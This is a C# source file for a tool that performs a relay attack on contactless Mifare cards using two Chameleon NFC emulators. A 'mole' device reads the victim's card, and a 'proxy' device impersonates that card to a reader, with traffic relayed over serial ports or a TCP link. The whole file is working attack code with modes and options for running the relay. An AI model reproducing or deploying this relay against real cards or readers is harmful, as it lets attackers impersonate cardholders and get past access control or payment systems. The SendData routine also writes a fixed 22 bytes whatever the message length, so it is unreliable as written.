using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Threading;
using System.IO;
using MifareModules;
using System.Net;
using System.Net.Sockets;

namespace ChameleonProxy
{
    class Program
    {
        const int anticollisionSize = 22;
        const int bufferSize = 1024;
        static void Main(string[] args)
        {
            // nastavit parametry
            ProgramArguments pArgs = new ProgramArguments(args);
            int waitTime = pArgs.MoleWaitTime;
            int proxyWaitTime = pArgs.ProxyWaitTime;

            if (pArgs.SimpleAttack)
            {
                SimpleRelayAttack(waitTime, proxyWaitTime, pArgs.MoleComName, pArgs.ProxyComName);
            }

            else if (pArgs.Proxy)
            {
                NetworkAttackProxy(pArgs);
            }
            else if (pArgs.Mole)
            {
                NetworkAttackMole(pArgs);
            }

        }

        private static void NetworkAttackProxy(ProgramArguments pArgs)
        {
            Console.WriteLine("** This is Proxy **");
            SerialModuleConfig chameleon2config = new SerialModuleConfig()
            {
                PortName = pArgs.ProxyComName,
            };
            SerialModule serial2 = new SerialModule(chameleon2config)
            {
                Verbose = false,
            };
            ChameleonModule proxy = new ChameleonModule(serial2)
            {
                Verbose = true,
                Role = "Proxy",
            };
            Console.WriteLine("** Chameleon Connected  via {0} **", pArgs.ProxyComName);

            IPEndPoint ep = new IPEndPoint(IPAddress.Parse(pArgs.MoleIp), int.Parse(pArgs.MolePort));
            TcpClient client = new TcpClient();
            client.Connect(ep);
            Console.WriteLine("** Client connected to {0}:{1}", ep.Address, ep.Port);
            var stream = client.GetStream();

            WaitForData(client, ms: 2);
            string receivedString = ReceiveData(stream);
            string[] acParameters = receivedString.Split('-');
            Console.WriteLine("** Received anticollision data {0} **", receivedString);

            string answer = AnticollisionToReader(pArgs.ProxyWaitTime, proxy, acParameters[0], acParameters[1], acParameters[2]);
            if (answer.Equals("") || answer.Equals("NO DATA", StringComparison.InvariantCultureIgnoreCase))
            {
                return;
            }
            do
            {
                SendData(stream, answer);
                WaitForData(client, 2);
                answer = ReceiveData(stream);
                answer = proxy.SendWithAnswer(answer);
            } while (true);
        }

        private static string ReceiveData(NetworkStream stream)
        {
            byte[] buffer = new byte[bufferSize];
            int readSize = stream.Read(buffer, 0, buffer.Length); // READ
            var receivedString = Encoding.ASCII.GetString(buffer, 0, readSize);
            return receivedString;
        }

        private static void NetworkAttackMole(ProgramArguments pArgs)
        {
            Console.WriteLine("** This is Mole **");
            SerialModuleConfig chameleon1Config = new SerialModuleConfig()
            {
                PortName = pArgs.MoleComName,
            };

            SerialModule serial1 = new SerialModule(chameleon1Config)
            {
                Verbose = false,
            };

            ChameleonModule mole = new ChameleonModule(serial1)
            {
                Verbose = true,
                Role = "Mole",
            };
            CardModule cardMole = new CardModule(mole) { Verbose = true };
            Console.WriteLine("** Chameleon Connected  via {0} **", pArgs.MoleComName);

            TcpListener listener = new TcpListener(IPAddress.Any, int.Parse(pArgs.MolePort));
            listener.Start();
            Console.WriteLine("** Server Listening for requests at {0}:{1} **\nWaiting for proxy connection...", pArgs.MoleIp, pArgs.MolePort);

            var client = listener.AcceptTcpClient();
            Console.WriteLine("Proxy connected!\n");

            string Atqa = "";
            string uid = "";
            string sak = "";
            string answer = "";

            AnticollisionWithCard(pArgs.MoleWaitTime, cardMole, ref Atqa, ref uid, ref sak);

            NetworkStream stream = client.GetStream();
            SendData(stream, $"{Atqa}-{uid}-{sak}");      //SEND
            do
            {
                WaitForData(client, ms: 2);

                answer = ReceiveData(stream);
                answer = mole.SendWithAnswer(answer);
                SendData(stream, answer);
            } while (true);

        }

        private static void SendData(NetworkStream stream, string message)
        {
            byte[] data = Encoding.ASCII.GetBytes(message);
            stream.Write(data, 0, anticollisionSize);
        }

        private static void SimpleRelayAttack(int moleWaitTime, int proxyWaitTime, string molePort = "COM3", string proxyPort = "COM4")
        {
            // initialize chameleons
            SerialModuleConfig chameleon1Config = new SerialModuleConfig()
            {
                PortName = molePort,

            };
            SerialModule serial1 = new SerialModule(chameleon1Config)
            {
                Verbose = false,
            };

            ChameleonModule mole = new ChameleonModule(serial1)
            {
                Verbose = true,
                Role = "Mole",
            };
            CardModule cardMole = new CardModule(mole) { Verbose = true };
            Console.WriteLine("** Chameleon Connected  via {0} **", molePort);

            SerialModuleConfig chameleon2config = new SerialModuleConfig()
            {
                PortName = proxyPort,
            };
            SerialModule serial2 = new SerialModule(chameleon2config)
            {
                Verbose = false,
            };
            ChameleonModule proxy = new ChameleonModule(serial2)
            {
                Verbose = true,
                Role = "Proxy",
            };
            Console.WriteLine("** Chameleon Connected  via {0} **", proxyPort);
            Console.ReadLine();

            string Atqa = "";
            string uid = "";
            string sak = "";
            string answer = "";
            AnticollisionWithCard(moleWaitTime, cardMole, ref Atqa, ref uid, ref sak);

            answer = AnticollisionToReader(proxyWaitTime, proxy, Atqa, uid, sak);
            if (answer.Equals("") || answer.Equals("NO DATA", StringComparison.InvariantCultureIgnoreCase))
            {
                return;
            }
            while (true)
            {
                //actual relaying
                answer = mole.SendWithAnswer(answer);
                answer = proxy.SendWithAnswer(answer);
                Sleep(proxyWaitTime);

            }

        }

        private static string AnticollisionToReader(int proxyWaitTime, ChameleonModule proxy, string Atqa, string uid, string sak)
        {
            string answer = "";

            //anticollise proxy to reader

            //assuming reqA has been sent
            proxy.SendWithAnswer(Atqa);
            Sleep(proxyWaitTime);
            proxy.SendWithAnswer(uid);
            Sleep(proxyWaitTime);
            answer = proxy.SendWithAnswer(sak);
            Sleep(proxyWaitTime);
            if (answer.Equals("") || answer.Equals("NO DATA", StringComparison.InvariantCultureIgnoreCase))
            {
                Console.WriteLine("*** anticollision on Proxy FAILED ***");
                return answer;
            }

            Console.WriteLine("*** anticollision on Proxy passed ***");
            return answer;
        }

        private static bool AnticollisionWithCard(int moleWaitTime, CardModule cardMole, ref string Atqa, ref string uid, ref string sak)
        {
            bool anticolisionPassed = false;
            while (!anticolisionPassed)
            {
                try
                {
                    // anticolise mole to card
                    Atqa = cardMole.ReqA();
                    Sleep(moleWaitTime);
                    uid = cardMole.Select();
                    Sleep(moleWaitTime);
                    sak = cardMole.SelectUid(uid);
                }
                catch (NoDataException)
                {
                    continue;
                }
                anticolisionPassed = true;
            }
            Console.WriteLine("*** anticollision on mole passed ***");
            return anticolisionPassed;
        }

        private static void WaitForData(TcpClient client, int ms)
        {
            while (client.Available <= 0)
            {
                Sleep(ms);
            }
        }
        private static void Sleep(int ms)
        {
            if (ms > 0)
            {
                Thread.Sleep(ms);
            }
        }
    }

    class ProgramArguments
    {
        public bool SimpleAttack = true;
        public bool Mole = false;
        public bool Proxy = false;
        public string MoleIp = "127.0.0.1";
        public string MolePort = "54321";
        public string MoleComName = "COM4";
        public string ProxyComName = "COM3";
        public int MoleWaitTime = 2;
        public int ProxyWaitTime = 0;

        public ProgramArguments(string[] args)
        {
            if (args.Contains("-s"))
            {
                SimpleAttack = true;
                Mole = false;
                Proxy = false;

                if (args.Contains("--mcom"))
                {
                    MoleComName = args[Array.IndexOf(args, "--mcom") + 1];
                }
                if (args.Contains("--pcom"))
                {
                    ProxyComName = args[Array.IndexOf(args, "--pcom") + 1];
                }

                if (args.Contains("-p") || args.Contains("-m"))
                {
                    PrintHelp();
                }
            }
            if (args.Contains("-m"))
            {
                SimpleAttack = false;
                Mole = true;
                Proxy = false;

                if (args.Contains("--mport"))
                {
                    MolePort = args[Array.IndexOf(args, "--mport") + 1];
                }
                if (args.Contains("--mip"))
                {
                    MoleIp = args[Array.IndexOf(args, "--mip") + 1];
                }
                if (args.Contains("--mcom"))
                {
                    MoleComName = args[Array.IndexOf(args, "--mcom") + 1];
                }
                if (args.Contains("-p") || args.Contains("-s"))
                {
                    PrintHelp();
                }
            }

            if (args.Contains("-p"))
            {
                SimpleAttack = false;
                Mole = false;
                Proxy = true;

                if (args.Contains("--mport"))
                {
                    MolePort = args[Array.IndexOf(args, "--mport") + 1];
                }

                if (args.Contains("--mip"))
                {
                    MoleIp = args[Array.IndexOf(args, "--mip") + 1];
                }
                if (args.Contains("--pcom"))
                {
                    ProxyComName = args[Array.IndexOf(args, "--pcom") + 1];
                }
                if (args.Contains("-m") || args.Contains("-s"))
                {
                    PrintHelp();
                }
            }

            if (args.Contains("-w"))
            {
                MoleWaitTime = int.Parse(args[Array.IndexOf(args, "-w") + 1]);
            }
            if (args.Contains("-r"))
            {
                ProxyWaitTime = int.Parse(args[Array.IndexOf(args, "-r") + 1]);
            }

            if (args.Contains("-h") || args.Contains("--help"))
            {
                PrintHelp();
            }
        }

        public static void PrintHelp()
        {
            Console.WriteLine("this is help ...");
            Environment.Exit(0);
        }
    }
}
